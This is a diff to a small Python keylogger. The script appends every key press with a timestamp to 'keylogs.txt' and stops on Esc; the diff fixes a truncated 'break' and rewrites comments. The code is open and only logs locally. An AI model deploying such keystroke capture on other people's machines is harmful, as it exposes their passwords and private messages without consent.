@@ -9,6 +9,6 @@ while True:
     with open("keylogs.txt", "a") as logs_file: # open the file in append mode to add new logs without overwriting existing ones
         keyboard_press = keyboard.read_event() # read the next keyboard event
         if keyboard_press.event_type == keyboard.KEY_DOWN: # check if the event is a key press
-            logs_file.write(f"[{datetime.datetime.now()}]: '{keyboard_press.name}'\n") # write the current date and time along with the name of the key that was pressed to log file
-        if keyboard_press.name == "esc": # end keylog tracking if esc is pressed
-            brea
+            logs_file.write(f"[{datetime.datetime.now()}]: '{keyboard_press.name}'\n") # write correctly formatted date, time, and name of the keypress into log file
+        if keyboard_press.name == "esc": # end the program if esc is pressed
+            break
